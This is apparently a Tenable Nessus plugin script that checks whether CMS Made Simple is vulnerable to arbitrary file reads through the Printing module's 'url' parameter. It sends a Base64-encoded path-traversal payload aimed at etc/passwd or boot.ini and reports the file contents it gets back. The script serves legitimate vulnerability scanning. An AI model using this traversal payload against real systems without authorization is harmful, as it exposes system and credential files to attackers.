#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(40551);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_bugtraq_id(36005); 
  script_osvdb_id(56876);
  script_xref(name:"EDB-ID", value:"9407");
  script_xref(name:"Secunia", value:"36255");

  script_name(english:"CMS Made Simple url Parameter Arbitrary File Access");
  script_summary(english:"Attempts to retrieve a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an information disclosure vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote web server is hosting CMS Made Simple, a content
management system written in PHP. 

The version of CMS Made Simple installed on the remote host fails to
sanitize user-supplied input to 'url' parameter in script
'modules/Printing/output.php' before using it to display the contents
of a specified Base64-encoded file.  An unauthenticated attacker can
exploit this vulnerability to read arbitrary files from the remote
system, subject to the privileges of the web server user id.");

  # http://web.archive.org/web/20090809053438/http://blog.cmsmadesimple.org/2009/08/05/announcing-cmsms-163-touho/
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?ccae246c"
  );
 
  script_set_attribute(attribute:"solution", value:
"Upgrade to CMS Made Simple version 1.6.3." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/08/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/08/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cmsmadesimple:cms_made_simple");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www",80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

port = get_http_port(default:80, php:TRUE);

# Try to determine the OS

os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = 'boot.ini';
  else file = 'etc/passwd';
  files = make_list(file);
}
else files = make_list('etc/passwd', 'boot.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['boot.ini'] = "[boot loader]";

if (thorough_tests)
  dirs = list_uniq(make_list("/cmsms","/cms","/cmsmadesimple",cgi_dirs()));
else
 dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  dir = string(dir, "/modules/Printing");

  foreach file (files) 
  {
    exploit = base64(str:string("../../../../../../../../../",file));
    url = string(dir,"/output.php?url=",exploit);

    res = http_send_recv3(method:"GET",item:url,port:port, exit_on_fail:TRUE);

    if(egrep(pattern:file_pats[file], string:res[2]) && 'content="CMS Made Simple' >< res[2])
    {
      if (report_verbosity > 0)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );

        if (report_verbosity > 1 && 'text-align: left;">' >< res[2])
        {
	  output = strstr(res[2], 'text-align: left;">') - 'text-align: left;">' - '</body>' - '</html>';
          report = string(report,'\n',
            "Here's the contents of the file : \n\n",
             crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
             output,"\n",
             crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        } 
        security_warning(port:port, extra:report);
      }  
      else security_warning(port);
      exit(0);
    } 
  }  
}
